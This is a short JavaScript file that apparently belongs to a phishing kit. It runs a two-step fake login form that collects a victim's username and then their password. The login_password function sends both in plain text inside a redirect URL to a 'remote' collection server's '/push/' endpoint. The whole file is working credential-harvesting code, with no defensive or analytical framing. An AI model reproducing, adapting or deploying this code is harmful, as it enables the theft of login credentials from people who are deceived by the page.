var username = null;
var password = null;

function login_username() {
    username = document.getElementById('usersname').value;
    document.getElementById('page_1').style.display = 'none';
    document.getElementById('page_2').style.display = 'block';
}
function login_password() {
    password = document.getElementById('password').value;
    var url = window.location.href;
    window.location.href = remote + '/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password;
}
function back() {
    document.getElementById('page_1').style.display = 'block';
    document.getElementById('page_2').style.display = 'none';
}